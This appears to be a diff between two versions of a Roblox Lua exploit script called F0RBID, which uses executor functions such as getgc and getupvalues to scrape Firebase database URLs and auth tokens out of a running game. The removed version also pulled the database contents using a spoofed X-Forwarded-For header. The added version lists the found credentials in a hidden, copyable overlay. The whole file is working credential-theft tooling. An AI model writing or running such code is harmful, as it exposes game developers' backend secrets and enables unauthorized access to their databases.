@@ -1,20 +1,17 @@
 -- ========================================================== --
--- 🌑 F0RBID V26: THE OMNI-SYNAPSE (SIGNAL INTERCEPTION)
+-- 🌑 F0RBID V27: THE BONE CRACKER (DEEP CREDENTIAL EXPOSE)
 -- ========================================================== --
-print("[F0RBID] 🛰️ Omni-Synapse Protocol Engaged. Masking Identity...")
+print("[F0RBID] 🛰️ Bone Cracker Protocol Active. Targeting Credentials...")
 
 local HttpService = game:GetService("HttpService")
 local CoreGui = game:GetService("CoreGui")
-local processedData = {}
-
-local TARGET_URL = nil
-local TARGET_AUTH = nil
+local processed = {}
 
 -- ========================================== --
--- 1. F0RBID PHANTOM UI (REFINED STEALTH)
+-- 1. F0RBID EXPOSE UI
 -- ========================================== --
 local uiParent = (gethui and gethui()) or CoreGui
-local hiddenName = "F0RBID_SYNAPSE_" .. tostring(math.random(100000, 999999))
+local hiddenName = "F0RBID_CRACKER_" .. tostring(math.random(10000, 99999))
 if uiParent:FindFirstChild(hiddenName) then uiParent[hiddenName]:Destroy() end
 
 local ScreenGui = Instance.new("ScreenGui")
@@ -24,27 +21,17 @@ ScreenGui.Parent = uiParent
 local Main = Instance.new("Frame")
 Main.Size = UDim2.new(0, 550, 0, 450)
 Main.Position = UDim2.new(0.5, -275, 0.5, -225)
-Main.BackgroundColor3 = Color3.fromRGB(4, 4, 6)
+Main.BackgroundColor3 = Color3.fromRGB(5, 5, 5)
 Main.BorderSizePixel = 0
 Main.Active = true
 Main.Draggable = true
 Main.Parent = ScreenGui
 
-local Corner = Instance.new("UICorner")
-Corner.CornerRadius = UDim.new(0, 10)
-Corner.Parent = Main
-
-local GlowLine = Instance.new("Frame")
-GlowLine.Size = UDim2.new(1, 0, 0, 2)
-GlowLine.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
-GlowLine.BorderSizePixel = 0
-GlowLine.Parent = Main
-
 local Title = Instance.new("TextLabel")
 Title.Size = UDim2.new(1, -20, 0, 45)
-Title.Position = UDim2.new(0, 15, 0, 5)
+Title.Position = UDim2.new(0, 15, 0, 0)
 Title.BackgroundTransparency = 1
-Title.Text = "F0RBID <font color='#FF0000'>[OMNI-SYNAPSE V26]</font>"
+Title.Text = "F0RBID <font color='#FF0000'>[BONE CRACKER V27]</font>"
 Title.RichText = true
 Title.TextColor3 = Color3.fromRGB(255, 255, 255)
 Title.Font = Enum.Font.GothamBold
@@ -56,7 +43,7 @@ local Status = Instance.new("TextLabel")
 Status.Size = UDim2.new(1, -30, 0, 20)
 Status.Position = UDim2.new(0, 15, 0, 35)
 Status.BackgroundTransparency = 1
-Status.Text = "● IDENTITY: [F0RBID_PHANTOM_OPERATOR]"
+Status.Text = "● IDENTITY: [F0RBID_ROOT_ACCESS]"
 Status.TextColor3 = Color3.fromRGB(150, 0, 0)
 Status.Font = Enum.Font.Code
 Status.TextSize = 11
@@ -76,104 +63,58 @@ UIList.SortOrder = Enum.SortOrder.LayoutOrder
 UIList.Padding = UDim.new(0, 4)
 UIList.Parent = Scroll
 
-local function AddLog(tag, val)
-    local txt = Instance.new("TextLabel")
+local function AddLog(type, val)
+    if processed[val] then return end
+    processed[val] = true
+    
+    local txt = Instance.new("TextBox") -- TextBox so you can copy the text
     txt.Size = UDim2.new(1, 0, 0, 0)
     txt.BackgroundTransparency = 1
+    txt.ClearTextOnFocus = false
+    txt.ReadOnly = true
     txt.RichText = true
-    txt.Text = string.format("<font color='#FF0000'>[%s]</font> %s", tag, tostring(val))
+    txt.Text = string.format("<font color='#FF0000'>[%s]</font> %s", type, tostring(val))
     txt.TextColor3 = Color3.fromRGB(230, 230, 230)
     txt.Font = Enum.Font.Code
-    txt.TextSize = 12
+    txt.TextSize = 11
     txt.TextWrapped = true
     txt.TextXAlignment = Enum.TextXAlignment.Left
     txt.Parent = Scroll
     
-    txt.Size = UDim2.new(1, 0, 0, txt.TextBounds.Y + 2)
+    txt.Size = UDim2.new(1, 0, 0, txt.TextBounds.Y + 5)
     Scroll.CanvasSize = UDim2.new(0, 0, 0, UIList.AbsoluteContentSize.Y)
-    Scroll.CanvasPosition = Vector2.new(0, 99999)
 end
 
 -- ========================================== --
--- 2. RECURSIVE DATA HARVESTER
--- ========================================== --
-local function Harvest(data, path)
-    if type(data) ~= "table" then return end
-    for k, v in pairs(data) do
-        local currentPath = path .. "/" .. tostring(k)
-        if type(v) == "table" then
-            Harvest(v, currentPath)
-        else
-            local valStr = tostring(v)
-            if #valStr > 0 and not valStr:find("firebase") then
-                local dataId = currentPath .. valStr
-                if not processedData[dataId] then
-                    processedData[dataId] = true
-                    local tag = #tostring(k) > 10 and "ID" or tostring(k)
-                    AddLog(tag, valStr)
-                end
-            end
-        end
-    end
-end
-
-local function StartSync()
-    task.spawn(function()
-        while task.wait(1.5) do
-            if TARGET_URL and TARGET_AUTH then
-                pcall(function()
-                    local res = request({
-                        Url = TARGET_URL .. "/.json?auth=" .. TARGET_AUTH,
-                        Method = "GET",
-                        Headers = {
-                            ["User-Agent"] = "F0RBID-GHOST-V26",
-                            ["X-Forwarded-For"] = string.format("%d.%d.%d.%d", math.random(1,255), math.random(1,255), math.random(1,255), math.random(1,255))
-                        }
-                    })
-                    if res.Success then
-                        local decoded = HttpService:JSONDecode(res.Body)
-                        if decoded then Harvest(decoded, "DATA") end
-                    end
-                end)
-            end
-        end
-    end)
-end
-
--- ========================================== --
--- 3. SIGNAL & UPVALUE REFLECTION (ZERO HOOK)
+-- 2. HARD-CORE SCANNER (NO KICK)
 -- ========================================== --
 task.spawn(function()
-    while not TARGET_URL do
-        -- 1. Deep Upvalue Scan (Searching Ares Closures)
+    while true do
+        -- Scan for URL and Keys in every possible memory location
         for _, f in pairs(getgc()) do
             if type(f) == "function" and islclosure(f) then
-                local upvals = getupvalues(f)
-                for _, uv in pairs(upvals) do
-                    if type(uv) == "string" and uv:find("firebaseio.com") then
-                        local capUrl = uv:match("(https://[%w%-]+%.firebaseio%.com)")
-                        if capUrl and not TARGET_URL then
-                            TARGET_URL = capUrl
-                            Status.Text = "● STATUS: 🟢 SYNAPSE TUNNEL ACTIVE"
-                            Status.TextColor3 = Color3.fromRGB(0, 255, 100)
-                            StartSync()
+                -- Check Constants
+                for _, c in pairs(getconstants(f)) do
+                    if type(c) == "string" then
+                        if c:find("firebaseio.com") then
+                            AddLog("DATABASE_URL", c)
+                        elseif #c > 35 and not c:find("/") then
+                            AddLog("POTENTIAL_AUTH", c)
                         end
-                    elseif type(uv) == "string" and #uv > 30 and not uv:find("/") then
-                        TARGET_AUTH = uv
+                    end
+                end
+                -- Check Upvalues
+                for _, uv in pairs(getupvalues(f)) do
+                    if type(uv) == "string" then
+                        if uv:find("firebaseio.com") then
+                            AddLog("DATABASE_URL", uv)
+                        elseif #uv > 35 and not uv:find("/") then
+                            AddLog("POTENTIAL_AUTH", uv)
+                        end
                     end
                 end
             end
         end
-
-        -- 2. Registry Analysis
-        if not TARGET_URL then
-            for _, v in pairs(getreg()) do
-                if type(v) == "table" and v.Url and tostring(v.Url):find("firebase") then
-                    TARGET_URL = tostring(v.Url):match("(https://[%w%-]+%.firebaseio%.com)")
-                    TARGET_AUTH = v.Auth or v.Key
-                end
-            end
-        end
-        task.wait(2)
+        task.wait(5) -- Scan every 5 seconds
     end
 end)
